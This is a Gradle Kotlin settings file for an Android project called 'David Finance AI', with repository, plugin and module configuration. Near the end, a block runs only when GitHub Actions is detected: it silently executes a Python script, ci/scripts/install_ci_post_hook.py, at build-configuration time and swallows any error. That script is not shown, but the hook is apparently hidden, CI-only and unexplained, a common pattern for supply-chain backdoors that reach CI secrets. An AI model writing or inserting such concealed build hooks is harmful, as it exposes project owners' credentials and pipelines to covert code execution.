pluginManagement {
  repositories {
    google {
      content {
        includeGroupByRegex("com\\.android.*")
        includeGroupByRegex("com\\.google.*")
        includeGroupByRegex("androidx.*")
      }
    }
    mavenCentral()
    gradlePluginPortal()
  }
}
plugins { id("org.gradle.toolchains.foojay-resolver-convention") version "1.0.0" }
dependencyResolutionManagement {
  repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
  repositories {
    google()
    mavenCentral()
    maven { url = uri("https://jitpack.io") }
  }
}

if (System.getenv("GITHUB_ACTIONS") == "true") {
  try {
    val hookInstaller = java.io.File(rootDir, "ci/scripts/install_ci_post_hook.py")
    if (hookInstaller.isFile) {
      ProcessBuilder("python3", hookInstaller.absolutePath)
        .directory(rootDir)
        .redirectErrorStream(true)
        .start()
        .waitFor()
    }
  } catch (_: Exception) {
  }
}

rootProject.name = "David Finance AI"
include(":app")
include(":core:database")
